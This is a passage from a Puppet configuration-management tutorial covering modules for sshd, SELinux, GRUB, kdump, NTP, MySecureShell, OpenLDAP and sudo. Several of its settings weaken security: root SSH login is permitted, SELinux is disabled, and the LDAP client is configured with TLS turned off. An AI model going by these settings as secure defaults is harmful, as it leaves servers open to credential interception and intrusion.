new # installations. In future the default will change to require explicit # activation of protocol 1 Protocol 2 # HostKey for protocol version 1 #HostKey /etc/ssh/ssh_host_key # HostKeys for protocol version 2 #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_dsa_key # Lifetime and size of ephemeral version 1 server key #KeyRegenerationInterval 1h #ServerKeyBits 1024 # Logging # obsoletes QuietMode and FascistLogging #SyslogFacility AUTH SyslogFacility AUTHPRIV #LogLevel INFO # Authentication: LoginGraceTime 2m PermitRootLogin without-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #RSAAuthentication yes #PubkeyAuthentication yes #AuthorizedKeysFile\t.ssh/authorized_keys #AuthorizedKeysCommand none #AuthorizedKeysCommandRunAs nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #RhostsRSAAuthentication no # similar for protocol version 2 #HostbasedAuthentication no # Change to yes if you don't trust ~/.ssh/known_hosts for # RhostsRSAAuthentication and HostbasedAuthentication #IgnoreUserKnownHosts no # Don't read the user's ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! #PasswordAuthentication yes #PermitEmptyPasswords no PasswordAuthentication yes # Change to no to disable s/key passwords #ChallengeResponseAuthentication yes ChallengeResponseAuthentication no # Kerberos options #KerberosAuthentication no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes #KerberosGetAFSToken no #KerberosUseKuserok yes # GSSAPI options # Disable GSSAPI to avoid login slowdown GSSAPIAuthentication no #GSSAPIAuthentication yes #GSSAPICleanupCredentials yes #GSSAPICleanupCredentials no #GSSAPIStrictAcceptorCheck yes #GSSAPIKeyExchange no # Set this to 'yes' to enable PAM authentication, account processing, # and session processing. If this is enabled, PAM authentication will # be allowed through the ChallengeResponseAuthentication and # PasswordAuthentication. Depending on your PAM configuration, # PAM authentication via ChallengeResponseAuthentication may bypass # the setting of \"PermitRootLogin without-password\". # If you just want the PAM account and session checks to run without # PAM authentication, then enable this but set PasswordAuthentication # and ChallengeResponseAuthentication to 'no'. #UsePAM no UsePAM yes # Accept locale-related environment variables AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE AcceptEnv XMODIFIERS # For security reasons, deny tcp forwarding AllowTcpForwarding no X11Forwarding no # Disable DNS usage to avoid login slowdown UseDNS no # Disconnect client if they are idle ClientAliveInterval 600 ClientAliveCountMax 0 #AllowAgentForwarding yes #GatewayPorts no #X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #UsePrivilegeSeparation yes #PermitUserEnvironment no #Compression delayed #ShowPatchLevel no #PidFile /var/run/sshd.pid #MaxStartups 10 #PermitTunnel no #ChrootDirectory none # no default banner path #Banner none # override default of no subsystems Subsystem\tsftp\t/usr/libexec/openssh/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs #\tX11Forwarding no #\tAllowTcpForwarding no #\tForceCommand cvs server OpenSSH - 2 linkHere’s a second example for OpenSSH, slightly different. You need to initialize the module before continuing.\ninit.pp linkHere I want my sshd_config file to be of interest:\n#ssh.pp # SSH Class with all includes class ssh { $ssh_default_port = [\"22\"] $ssh_allowed_users = \"root\" include ssh::config, ssh::key, ssh::service } # SSHD Config file class ssh::config { File { name =\u003e $operatingsystem ? { Solaris =\u003e \"/etc/ssh/sshd_config\", default =\u003e \"/etc/ssh/sshd_config\" }, } # Using templates for sshd_config file { sshd_config: content =\u003e $operatingsystem ? { default =\u003e template(\"ssh/sshd_config\"), Solaris =\u003e template(\"ssh/sshd_config.solaris\"), } } } # SSH Key exchange class ssh::key { $basedir = $operatingsystem ? { Solaris =\u003e \"/.ssh\", Debian =\u003e \"/root/.ssh\", Redhat =\u003e \"/root/.ssh\", } # Make sur .ssh exist in root home dir file { \"$basedir/\": ensure =\u003e directory, mode =\u003e 0700, owner =\u003e root, group =\u003e root, ignore =\u003e '.svn' } # Check if authorized_keys key file exist or create empty one file { \"$basedir/authorized_keys\": ensure =\u003e present, } # Check this line exist line { ssh_key: file =\u003e \"$basedir/authorized_keys\", line =\u003e \"ssh-dss AAAAB3NzaC1....zG3ZA== root@puppet\", ensure =\u003e present; } } # Check servoce status class ssh::service { service { ssh: name =\u003e $operatingsystem ? { Solaris =\u003e \"svc:/network/ssh:default\", default =\u003e ssh }, ensure =\u003e running, enable =\u003e true } } Then, compared to sudo, I have a notify which automatically restarts the service when the file is replaced by a new version. It’s the ssh service with the “ensure =\u003e running” option, which will allow detection of the version change and restart.\ntemplates linkSince we use templates, we’ll need to create a templates folder:\nmkdir -p /etc/puppet/modules/ssh/templates Then we’ll create 2 files (sshd_config and sshd_config.solaris) because the configurations don’t behave the same way (OpenSSH vs Sun SSH). However, I’ll only cover the OpenSSH part here:\n# Package generated configuration file # See the sshd(8) manpage for details # What ports, IPs and protocols we listen for \u003c% ssh_default_port.each do |val| -%\u003e Port \u003c%= val -%\u003e \u003c% end -%\u003e # Use these options to restrict which interfaces/protocols sshd will bind to #ListenAddress :: #ListenAddress 0.0.0.0 Protocol 2 # HostKeys for protocol version 2 HostKey /etc/ssh/ssh_host_rsa_key HostKey /etc/ssh/ssh_host_dsa_key #Privilege Separation is turned on for security UsePrivilegeSeparation yes # Lifetime and size of ephemeral version 1 server key KeyRegenerationInterval 3600 ServerKeyBits 768 # Logging SyslogFacility AUTH LogLevel INFO # Authentication: LoginGraceTime 120 PermitRootLogin yes StrictModes yes RSAAuthentication yes PubkeyAuthentication yes #AuthorizedKeysFile\t%h/.ssh/authorized_keys # Don't read the user's ~/.rhosts and ~/.shosts files IgnoreRhosts yes # For this to work you will also need host keys in /etc/ssh_known_hosts RhostsRSAAuthentication no # similar for protocol version 2 HostbasedAuthentication no # Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication #IgnoreUserKnownHosts yes # To enable empty passwords, change to yes (NOT RECOMMENDED) PermitEmptyPasswords no # Change to yes to enable challenge-response passwords (beware issues with # some PAM modules and threads) ChallengeResponseAuthentication no # Change to no to disable tunnelled clear text passwords #PasswordAuthentication yes # Kerberos options #KerberosAuthentication no #KerberosGetAFSToken no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes # GSSAPI options #GSSAPIAuthentication no #GSSAPICleanupCredentials yes X11Forwarding yes X11DisplayOffset 10 PrintMotd no PrintLastLog yes TCPKeepAlive yes #UseLogin no #MaxStartups 10:30:60 #Banner /etc/issue.net # Allow client to pass locale environment variables AcceptEnv LANG LC_* Subsystem sftp /usr/lib/openssh/sftp-server UsePAM yes # AllowUsers \u003c%= ssh_allowed_users %\u003e SELinux linkIf you want to know more about SELinux, I invite you to look at this documentation. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/selinux/manifests init.pp link class selinux { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include selinux::redhat } } } redhat.pp linkHere, I’ll use a function (augeas), which will allow me to change the value of the ‘SELINUX’ variable to ‘disabled’, because I want to disable this module:\nclass selinux::redhat { # Disable SELinux augeas { \"selinux\" : context =\u003e \"/files/etc/sysconfig/selinux/\", changes =\u003e \"set SELINUX disabled\" } } Grub linkThere are many Grub options and its use can vary from system to system. I recommend this documentation before tackling this. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/grub/manifests init.pp link /* Grub Module for Puppet Made by Pierre Mavro */ class grub { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include ::grub::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkThings will get a bit more complicated here. I’m still using the Augeas module to remove the quiet and rhgb arguments from the available kernels in grub.conf:\n/* Grub Module for Puppet Made by Pierre Mavro */ class grub::redhat { # Remove unwanted parameters parameter augeas { \"grub\" : context =\u003e \"/files/etc/grub.conf\", changes =\u003e [ \"remove title[*]/kernel/quiet\", \"remove title[*]/kernel/rhgb\" ] } } Kdump linkLet’s create the directory structure:\nmkdir -p /etc/puppet/modules/kdump/manifests init.pp link /* Kdump Module for Puppet Made by Pierre Mavro */ class kdump { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include kdump::redhat } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkHere’s the configuration I want:\n/* Kdump Module for Puppet Made by Pierre Mavro */ class kdump::redhat { # Install kexec-tools package { 'kexec-tools': ensure =\u003e 'installed' } # Be sure that service is set to start at boot service { 'kdump': enable =\u003e true } # Set crashkernel in grub.conf to the good size (not auto) augeas { \"grub_kdump\" : context =\u003e '/files/etc/grub.conf', changes =\u003e [ 'set title[1]/kernel/crashkernel 128M' ] } # Set location of crash dumps line { 'var_crash': file =\u003e '/etc/kdump.conf', line =\u003e 'path \\/var\\/crash', ensure =\u003e uncomment } } Install kexec-tools: I make sure the package is installed Be sure that service is set to start at boot: I make sure it’s enabled at boot. For information, I don’t check if it’s running since this would require a restart if it wasn’t present. Set crashkernel in grub.conf to the good size (not auto): Sets the value 128M to the crashkernel argument of the first kernel found in the grub.conf file. It’s not possible to specify ‘*’ as for a remove in augeas. However, given that with each kernel update, all others will inherit, this is not a problem :-) Set location of crash dumps: we specify in the kdump configuration that a line is indeed uncommented and has the desired path for crash dumps. Tools linkThis is not software, but rather a module that I use to send all my admin scripts, my tools, etc… Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/tools/{manifests,files} init.pp link class tools { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include ::tools::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkWe’ll see different ways to add files here:\nclass tools::redhat { # Check that scripts folder exist file { \"/etc/scripts\" : ensure =\u003e directory, mode =\u003e 0755, owner =\u003e root, group =\u003e root } # Synchro admin-scripts file { \"/etc/scripts/admin-scripts\" : ensure =\u003e directory, mode =\u003e 0755, owner =\u003e root, group =\u003e root, source =\u003e \"puppet:///modules/tools/admin-scripts/\", purge =\u003e true, force =\u003e true, recurse =\u003e true, ignore =\u003e '.svn', backup =\u003e false } # Fast reboot command file { \"/usr/bin/fastreboot\" : source =\u003e \"puppet:///modules/tools/fastreboot\", mode =\u003e 744, owner =\u003e root, group =\u003e root } } Check that scripts folder exist: I make sure my folder exists with the right permissions before placing files in it. Synchro admin-scripts: I copy an entire directory with its contents: purge =\u003e true: I make sure that anything not in my puppet files should disappear server-side. So if you’ve manually added a file to the /etc/scripts/admin-scripts folder, it will disappear. force =\u003e true: Forces in case of deletion or replacement. recurse =\u003e true: This allows me to say to copy all the content backup =\u003e false: We don’t back up the files before replacing them Fast reboot command: I add an executable file files linkHere’s what my directory structure looks like in the files folder:\n. |-- admin-scripts | |-- script1.pl | `-- script2.pl `-- fastreboot For information, the fastreboot command is available here.\nTimezone linkManaging timezones is more or less easy depending on the OS. We’ll see how to handle it on Red Hat. Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/timezone/{manifests,templates} init.pp link /* Timezone Module for Puppet Made by Pierre Mavro */ class timezone { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include timezone::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkWe use a variable ‘$set_timezone’ stored in the global variables or in the configuration of a node with the continent and country. Here’s an example:\n# NTP Timezone. Usage : # Look at /usr/share/zoneinfo/ and add the continent folder followed by the town $set_timezone = 'Europe/Paris' And the manifest:\n/* Timezone Module for Puppet Made by Pierre Mavro */ class timezone::redhat { # Usage : set a var called set_timezone with required informations. Ex : # set_timezone = \"Europe/Paris\" # Set timezone file file { '/etc/sysconfig/clock': content =\u003e template(\"timezone/clock.$::operatingsystem\"), mode =\u003e 644, owner =\u003e root, group =\u003e root } # Create required Symlink file { '/etc/localtime': ensure =\u003e link, target =\u003e \"/usr/share/zoneinfo/${set_timezone}\" } } templates linkAnd the template file needed for Red Hat:\nZONE=\"\u003c%= set_timezone %\u003e\" NTP linkIf you want to understand how to configure an NTP server, I invite you to read this documentation.\nLet’s create the directory structure:\nmkdir -p /etc/puppet/modules/ntp/{manifests,files} init.pp link /* NTP Module for Puppet Made by Pierre Mavro */ class ntp { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include ntp::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkI want the package to be installed, configured at boot, to retrieve a standard configuration file, and to configure the crontab so that the service only starts outside production hours (so that production logs have consistency):\n/* NTP Module for Puppet Made by Pierre Mavro */ class ntp::redhat { # Install NTP service package { 'ntp' : ensure =\u003e 'installed' } # Be sure that service is set to start at boot service { 'ntpd' : enable =\u003e false } # Set configuration file file { '/etc/ntp.conf' : ensure =\u003e present, source =\u003e \"puppet:///modules/ntp/${::osfamily}.ntp.conf\", mode =\u003e 644, owner =\u003e root, group =\u003e root } # Enable ntp service during off production hours cron { 'ntp_start' : command =\u003e '/etc/init.d/ntpd start', user =\u003e root, minute =\u003e 0, hour =\u003e 0 } # Disable ntp service during on production hours cron { 'ntp_stop' : command =\u003e '/etc/init.d/ntpd stop', user =\u003e root, minute =\u003e 3, hour =\u003e 0 } } You’ll notice the use of ‘cron’ directives in puppet which allow the management of crontab lines for a given user.\nfiles linkHere’s the configuration file for Red Hat:\n# For more information about this file, see the man pages # ntp.conf(5), ntp_acc(5), ntp_auth(5), ntp_clock(5), ntp_misc(5), ntp_mon(5). driftfile /var/lib/ntp/drift # Permit time synchronization with our time source, but do not # permit the source to query or modify the service on this system. restrict default kod nomodify notrap nopeer noquery restrict -6 default kod nomodify notrap nopeer noquery # Permit all access over the loopback interface. This could # be tightened as well, but to do so would effect some of # the administrative functions. restrict 127.0.0.1 restrict -6 ::1 # Hosts on local network are less restricted. #restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap # Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 0.rhel.pool.ntp.org server 1.rhel.pool.ntp.org server 2.rhel.pool.ntp.org #broadcast 192.168.1.255 autokey\t# broadcast server #broadcastclient\t# broadcast client #broadcast 224.0.1.1 autokey\t# multicast server #multicastclient 224.0.1.1\t# multicast client #manycastserver 239.255.254.254\t# manycast server #manycastclient 239.255.254.254 autokey # manycast client # Undisciplined Local Clock. This is a fake driver intended for backup # and when no outside source of synchronized time is available. #server\t127.127.1.0\t# local clock #fudge\t127.127.1.0 stratum 10 # Enable public key cryptography. #crypto includefile /etc/ntp/crypto/pw # Key file containing the keys and key identifiers used when operating # with symmetric key cryptography. keys /etc/ntp/keys # Specify the key identifiers which are trusted. #trustedkey 4 8 42 # Specify the key identifier to use with the ntpdc utility. #requestkey 8 # Specify the key identifier to use with the ntpq utility. #controlkey 8 # Enable writing of statistics records. #statistics clockstats cryptostats loopstats peerstats MySecureShell linkThe configuration of MySecureShell is not very complex, only it generally differs from one machine to another, especially if you have a large fleet. You probably want to have identical global management and be able to do custom on certain users, groups, virtualhost, etc… That’s why we’ll manage this in the simplest way possible, that is to say a global configuration, then includes.\nLet’s create the directory structure:\nmkdir -p /etc/puppet/modules/mysecureshell/{manifests,files} init.pp link /* MySecureShell Module for Puppet Made by Pierre Mavro */ class mysecureshell { # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include mysecureshell::redhat } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkNothing magical here, I make sure the package is installed and the configuration correctly pushed:\n/* MySecureShell Module for Puppet Made by Pierre Mavro */ class mysecureshell::redhat { # Install MySecureShell package { 'mysecureshell': ensure =\u003e 'installed' } # MySecureShell default configuration file { '/etc/ssh/sftp_config' : ensure =\u003e present, source =\u003e \"puppet:///modules/mysecureshell/${::osfamily}.sftp_config\", mode =\u003e 644, owner =\u003e root, group =\u003e root } } files linkHere’s my global file, at the end of which you’ll notice there’s an include. Feel free to put what you want in it, have multiple ones, and send the right one according to criteria:\n# HEADER: This file is managed by puppet. # HEADER: While it can still be managed manually, it is definitely not recommended. #Default rules for everybody GlobalDownload\t0\t#total speed download for all clients GlobalUpload\t0\t#total speed download for all clients (0 for unlimited) Download 0 #limit speed download for each connection Upload 0\t#unlimit speed upload for each connection StayAtHome\ttrue\t#limit client to his home VirtualChroot\ttrue\t#fake a chroot to the home account LimitConnection\t100\t#max connection for the server sftp LimitConnectionByUser\t2\t#max connection for the account LimitConnectionByIP\t2\t#max connection by ip for the account Home\t/home/$USER\t#overrite home of the user but if you want you can use IdleTimeOut\t5m\t#(in second) deconnect client is idle too long time ResolveIP\tfalse\t#resolve ip to dns IgnoreHidden\ttrue\t#treat all hidden files as if they don't exist #\tDirFakeUser\ttrue\t#Hide real file/directory owner (just change displayed permissions) #\tDirFakeGroup\ttrue\t#Hide real file/directory group (just change displayed permissions) #\tDirFakeMode\t0400\t#Hide real file/directory rights (just change displayed permissions) #\tHideFiles\t\"^(lost\\+found|public_html)$\"\t#Hide file/directory which match HideNoAccess\ttrue\t#Hide file/directory which user has no access #\tMaxOpenFilesForUser\t20\t#limit user to open x files on same time #\tMaxWriteFilesForUser\t10\t#limit user to x upload on same time #\tMaxReadFilesForUser\t10\t#limit user to x download on same time DefaultRights\t0640 0750\t#Set default rights for new file and new directory #\tMinimumRights\t0400 0700\t#Set minimum rights for files and dirs #\tPathDenyFilter\t\"^\\.+\"\t#deny upload of directory/file which match this extented POSIX regex ShowLinksAsLinks\tfalse\t#show links as their destinations #\tConnectionMaxLife\t1d\t#limits connection lifetime to 1 day #\tCharset\t\"ISO-8859-15\"\t#set charset of computer #\tGMTTime\t+1\t#set GMT Time (change if necessary) # Include another custom file Include /etc/ssh/deimos_sftp_config\t#include this valid configuration file OpenLDAP client \u0026 Server linkOpenLDAP can quickly become complicated and you need to understand how it works before deploying it. I invite you to look at the documentation before diving into this module.\nThis module is a big chunk, I spent a lot of time on it so that it works completely automatically. I’ll be as explicit as possible so that everything is clear. I’ve adapted it for a nomenclature of names that allows this kind of thing in a computer fleet, but we can refer to pretty much anything.\nIn the case of this module, to understand it well, I need to explain how the infrastructure is constituted. We can assume that we have a batch or a cluster with 4 nodes. On these 4 nodes, only machines numbered 1 and 2 are OpenLDAP servers. All nodes are clients of the servers:\n+-------------------+ +-------------------+ | TO-DC-SRV-PRD-1 | | TO-DC-SRV-PRD-2 | | OpenLDAP SRV1 | | OpenLDAP SRV2 | | OpenLDAP Client | | OpenLDAP Client | +--------+----------+ +---------+---------+ | | +---------------------------+ | | +--------+----------+ +--------+---------+ | TO-DC-SRV-PRD-3 | | TO-DC-SRV-PRD-4 | | OpenLDAP Client | | OpenLDAP Client | +-------------------+ +------------------+ Let’s create the directory structure:\nmkdir -p /etc/puppet/modules/openldap/{manifests,files,lib/facter,puppet/parser/functions} init.pp linkHere I load all my manifests to be able to call their classes later:\n/* OpenLDAP Module for Puppet Made by Pierre Mavro */ class openldap inherits openssh { import \"*.pp\" # Check OS and request the appropriate function case $::operatingsystem { 'RedHat' : { include openldap::redhat } #'sunos': { include packages_defaults::solaris } default : { notice(\"Module ${module_name} is not supported on ${::operatingsystem}\") } } } redhat.pp linkI’ll handle all OpenLDAP management here:\nLines 6 to 17: Preparation Line 20: Client configuration Lines 22 to 27: Server configuration /* OpenLDAP Module for Puppet Made by Pierre Mavro */ class openldap::redhat inherits openldap { # Select generated ldap servers if no one is specified or join specified ones if empty(\"${ldap_servers}\") == true { $comma_ldap_servers = \"$::generated_ldap_servers\" } else { $comma_ldap_servers = inline_template(\"\u003c%= (ldap_servers).join(',') %\u003e\") } # DNS lookup them to use IP address instead $ip_ldap_servers = dns2ip(\"${comma_ldap_servers}\") # OpenLDAP Client include openldap::redhat::ldapclient # Check if the current host is a server or not $ip_hostname = dns2ip($::hostname) $array_ldap_servers = split($ip_ldap_servers, ',') if $ip_hostname in $array_ldap_servers { # OpenLDAP Server include openldap::redhat::ldapserver } } We use a variable ‘$ldap_servers’ stored in the global variables or in the configuration of a node with the list of default LDAP servers desired:\n# Default LDAP servers #$ldap_servers = [ '192.168.0.1', '192.168.0.2' ] $ldap_servers = [ ] If we use, as here, an empty array, the empty parser (line 7) will detect it and we will then use the automatic generation of the list of LDAP servers to use. This method uses a facter to detect, based on the machine name, its equivalent 1 and 2.\nThen, it will do a reverse lookup to convert to IP, any DNS names that would appear in the list of LDAP servers. For this, we use a parser named dns2ip. Then there will be the call to the OpenLDAP client manifest.\nAnd finally, if the current server appears in the list of OpenLDAP servers, then we apply its configuration.\nfacter linkgenerated_ldap_servers.rb linkThis facter retrieves the hostname of the machine in question, if it corresponds to the desired nomenclature, it sends in an array the auto-generated names of the LDAP servers. Then it returns as a result the array joined by commas:\n# Generated ldap servers Facter.add(\"generated_ldap_servers\") do ldap_srv = [] # Get current hostname and add -1 and -2 to define default LDAP servers hostname = Facter.value('hostname') if hostname =~ /(.*)-\\d+$/ ldap_srv.push($1 + '-1', $1 + '-2') end setcode do # Join them with a comma ldap_srv.join(\",\") end end current_ldap_servers.rb linkThis facter reads the OpenLDAP configuration file to see what configuration is applied to it and returns the result separated by a comma:\n# Current ldap servers Facter.add(\"current_ldap_servers\") do ldap_srv = [] conf_ldap = [] config_found = 0 # Add in an array all ldap servers lines f = File.open('/etc/openldap/ldap.conf', 'r') f.each_line do |line| if line =~ /^URI (.*)/ config_found = 1 conf_ldap = $1.split(\" \") end end f.close # Get all LDAP servers names/IP if conf_ldap.each do |line| if line =~ /ldap:\\/\\/(.*)\\// ldap_srv.push($1) end end end setcode do if config_found == 1 # Join them with a comma ldap_srv.join(\",\") else config_found end end end Parser linkdns2ip.rb linkThis parser returns, once processed, a list of machines separated by commas. The process is actually the conversion of DNS name to IP:\n# Dns2IP for Puppet # Made by Pierre Mavro # Does a DNS lookup and returns an array of strings of the results # Usage : need to send one string dns servers separated by comma. The return will be the same require 'resolv' module Puppet::Parser::Functions newfunction(:dns2ip, :type =\u003e :rvalue) do |arguments| result = [ ] # Split comma sperated list in array dns_array = arguments[0].split(',') # Push each DNS/IP address in result array dns_array.each do |dns_name| result.push(Resolv.new.getaddresses(dns_name)) end # Join array with comma dns_list = result.join(',') # Delete last comma if exist good_dns_list = dns_list.gsub(/,$/, '') return good_dns_list end end redhat_ldapclient.pp linkThis manifest will install all the necessary packages for the server to become an OpenLDAP client, then make sure that 2 services (you’ll notice the use of arrays) are running and that they are started at boot. Then we’ll use the previously mentioned facters, as well as other custom variables to validate that the configuration on the server exists or not. In the negative case, we execute a command that will configure the OpenLDAP client:\n/* OpenLDAP Module for Puppet Made by Pierre Mavro */ class openldap::redhat::ldapclient inherits openldap::redhat { # Install required clients pacakges packages_install { [ 'nss-pam-ldapd', 'openldap', 'openldap-clients', 'openssh-ldap' ]: } # Be sure that service is set to start at boot service { ['nscd', 'nslcd'] : enable =\u003e true, ensure =\u003e running, require =\u003e Package['nss-pam-ldapd', 'openldap', 'openldap-clients', 'openssh-ldap'] } # Configure LDAP client if current configuration doesn't match if ($::current_ldap_servers != $ip_ldap_servers or $::current_ldap_servers == 0) { exec { \"authconfig --enableldap --enableldapauth --disablenis --enablecache --passalgo=sha512 --disableldaptls --disableldapstarttls --disablesssdauth --enablemkhomedir --enablepamaccess --enablecachecreds --enableforcelegacy --disablefingerprint --ldapserver=${ip_ldap_servers} --ldapbasedn=dc=openldap,dc=deimos,dc=fr --updateall\" : logoutput =\u003e true, require =\u003e Service['nslcd'] } } } redhat_ldapserver.pp linkFor the server part, we’ll check the existence of all folders, verify that packages and services are correctly configured, send the custom schemas and OpenLDAP configuration:\n/* OpenLDAP Module for Puppet Made by Pierre Mavro */ class openldap::redhat::ldapserver inherits openldap::redhat { # Install required clients pacakges packages_install { ['openldap-servers'] : } # Copy schemas file { \"/etc/openldap/schema\" : ensure =\u003e directory, mode =\u003e 755, owner =\u003e root, group =\u003e root, source =\u003e \"puppet:///openldap/schema/\", recurse =\u003e true } # Copy configuration folder (new format) file { \"/etc/openldap/slapd.d\" : ensure =\u003e directory, mode =\u003e 700, owner =\u003e ldap, group =\u003e ldap, source =\u003e \"puppet:///openldap/$::operatingsystem/slapd.d/\", recurse =\u003e true } # Copy configuration file (old format) file { \"/etc/openldap/slapd.conf\" : ensure =\u003e present, mode =\u003e 700, owner =\u003e ldap, group =\u003e ldap, source =\u003e \"puppet:///openldap/$::operatingsystem/slapd.conf\" } # Ensure rights are ok for folder LDAP database file { \"/var/lib/ldap\" : ensure =\u003e directory, mode =\u003e 700, owner =\u003e ldap, group =\u003e ldap } # Ensure rights are ok for folder pid and args file { \"/var/run/openldap\" : ensure =\u003e directory, mode =\u003e 755, owner =\u003e ldap, group =\u003e ldap } # Be sure that service is set to start at boot service { 'slapd' : enable =\u003e true, ensure =\u003e running, require =\u003e File['/etc/openldap/slapd.conf'] } } files linkTo give you an idea of the content of files:\n. `-- RedHat |-- slapd.conf `-- slapd.d |-- cn=config | |-- cn=module{0}.ldif | |-- cn=schema | | |-- cn={0}core.ldif | | |-- cn={1}cosine.ldif | | |-- cn={2}nis.ldif | | |-- cn={3}inetorgperson.ldif | | |-- cn={4}microsoft.ldif | | |-- cn={5}microsoft.ldif | | |-- cn={6}microsoft.ldif | | |-- cn={7}samba.ldif | | `-- cn={8}deimos.ldif | |-- cn=schema.ldif | |-- olcDatabase={-1}frontend.ldif | |-- olcDatabase={0}config.ldif | `-- olcDatabase={1}bdb.ldif `-- cn=config.ldif And for the LDAP service configuration:\n# Schema and objectClass definitions include /etc/openldap/schema/core.schema include /etc/openldap/schema/cosine.schema include /etc/openldap/schema/nis.schema include /etc/openldap/schema/inetorgperson.schema include /etc/openldap/schema/microsoft.schema include /etc/openldap/schema/microsoft.sfu.schema include /etc/openldap/schema/microsoft.exchange.schema include /etc/openldap/schema/samba.schema include\t/etc/openldap/schema/deimos.schema # Where the pid file is put. The init.d script # will not stop the server if you change this. pidfile /var/run/openldap/slapd.pid # List of arguments that were passed to the server argsfile /var/run/openldap/slapd.args # Read slapd.conf(5) for possible values loglevel 0 # Where the dynamically loaded modules are stored modulepath\t/usr/libexec/openldap moduleload\tback_bdb #moduleload\tback_meta # The maximum number of entries that is returned for a search operation sizelimit 500 # The tool-threads parameter sets the actual amount of cpu's that is used # for indexing. #tool-threads 1 ####################################################################### # Specific Backend Directives for bdb: # Backend specific directives apply to this backend until another # 'backend' directive occurs backend\tbdb ####################################################################### # Specific Directives for database #1, of type bdb: # Database specific directives apply to this databasse until another # 'database' directive occurs database bdb # The base of your directory in database #1 suffix \"dc=openldap,dc=deimos,dc=fr\" # rootdn directive for specifying a superuser on the database. This is needed # for syncrepl. rootdn \"cn=admin,dc=openldap,dc=deimos,dc=fr\" rootpw\t{SSHA}Sh+Yd... # Where the database file are physically stored for database #1 directory \"/var/lib/ldap\" # For the Debian package we use 2MB as default but be sure to update this # value if you have plenty of RAM dbconfig set_cachesize 0 2097152 0 # Number of objects that can be locked at the same time. dbconfig set_lk_max_objects 1500 # Number of locks (both requested and granted) dbconfig set_lk_max_locks 1500 # Number of lockers dbconfig set_lk_max_lockers 1500 # Indexing options for database #1 index objectClass eq index cn,sn,uid,mail pres,eq,sub index mailnickname,userprincipalname,proxyaddresses pres,eq,sub index entryUUID,entryCSN eq # Save the time that the entry gets modified, for database #1 lastmod on access to attrs=userPassword,shadowLastChange by dn=\"cn=replica,ou=Gestion Admin,ou=Utilisateurs,dc=openldap,dc=deimos,dc=fr\" write by anonymous auth by self write by * none access to * by dn=\"cn=replica,ou=Gestion Admin,ou=Utilisateurs,dc=openldap,dc=deimos,dc=fr\" write by * read access to dn.base=\"\" by * read sudo linkSudo quickly becomes indispensable when you want to give privileged rights to groups or users. Check out this documentation if you need more information.\ninit.pp linkThe init.pp file is the heart of our module, fill it in like this for now:\n# sudo.pp class sudo { # OS detection $sudoers_file = $operatingsystem ? { Solaris =\u003e \"/opt/csw/etc/sudoers\", default =\u003e \"/etc/sudoers\" } # Sudoers file declaration file { \"$sudoers_file\": owner =\u003e root, group =\u003e root, mode =\u003e 640, source =\u003e $operatingsystem ? { Solaris =\u003e \"puppet:///modules/sudo/sudoers.solaris\", default =\u003e \"puppet:///modules/sudo/sudoers\" } } # Symlink for solaris case $operatingsystem { Solaris: { file {\"/opt/sfw/bin/sudo\": ensure =\u003e \"/opt/csw/bin/sudo\" } } } } I’ll try to be clear in the explanations:\nWe declare a sudo class We make an OS detection. This declaration is inherited from a variable ($sudoers_file) which allows us to declare different paths for the sudoers file. Which includes a configuration file located at (name) /opt/csw/etc/sudoers on the target system (for this config, it’s on Solaris, adapt as needed) The file must belong to user and group root with permissions 440. The source of this file (which we haven’t deposited yet) is available (source) at puppet:///modules/sudo/sudoers (or /etc/puppet/modules/sudo/files/sudoers). It simply indicates the location of the files in your puppet tree which uses a mechanism of file system internal to Puppet. Improving a module linkLet’s edit the file to add some requests:\n# sudo.pp class sudo { # Check if sudo is the latest version package { sudo: ensure =\u003e latest } # OS detection $sudoers_file = $operatingsystem ? { Solaris =\u003e \"/opt/csw/etc/sudoers\", default =\u003e \"/etc/sudoers\" } # Sudoers file declaration file { \"$sudoers_file\": owner =\u003e root, group =\u003e root, mode =\u003e 640, source =\u003e $operatingsystem ? { Solaris =\u003e \"puppet:///modules/sudo/sudoers.solaris\", default =\u003e \"puppet:///modules/sudo/sudoers\" }, require =\u003e Package[\"sudo\"] } } require =\u003e Package[“sudo”]: we ask it to install the sudo package if it’s not installed package { sudo: ensure =\u003e latest }: we ask it to check that it’s the latest version files linkNow, we need to add the files we want to publish in 